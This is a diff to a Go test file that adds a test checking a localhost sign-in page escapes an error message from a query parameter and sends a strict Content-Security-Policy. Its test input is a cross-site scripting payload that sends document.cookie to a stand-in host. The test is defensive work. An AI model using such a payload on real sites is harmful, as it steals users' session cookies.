@@ -3,6 +3,7 @@ package llm
 import (
 	"crypto/sha256"
 	"encoding/base64"
+	"net/http/httptest"
 	"net/url"
 	"strings"
 	"testing"
@@ -97,5 +98,31 @@ func TestTheAccountIsReadFromWhatTheServiceIssued(test *testing.T) {
 	// failing: the sign-in itself succeeded, and this is a nicety.
 	if account, plan := accountOfToken("not-a-token"); account != "" || plan != "" {
 		test.Errorf("it read %q and %q out of nothing", account, plan)
+	}
+}
+
+// What the page says is escaped, because some of it comes from the address
+// the browser arrived on.
+//
+// The service's description of what went wrong is a query parameter, and
+// anything that can reach this port can set it. Written into the page as it
+// came, it would run there: the page is served from localhost, so script in
+// it runs with whatever that origin is worth.
+func TestTheSignInPageEscapesWhatItSays(test *testing.T) {
+	test.Parallel()
+
+	recorder := httptest.NewRecorder()
+	writeSignInPage(recorder, `That did not work: <script>fetch("//elsewhere.test?"+document.cookie)</script>`)
+	body := recorder.Body.String()
+
+	if strings.Contains(body, "<script>") {
+		test.Errorf("a script tag was written into the page: %q", body)
+	}
+	if !strings.Contains(body, "&lt;script&gt;") {
+		test.Errorf("the tag was not escaped: %q", body)
+	}
+	// And the page asks for nothing and runs nothing, whatever gets past.
+	if policy := recorder.Header().Get("Content-Security-Policy"); !strings.Contains(policy, "default-src 'none'") {
+		test.Errorf("the page allows loading things: %q", policy)
 	}
 }
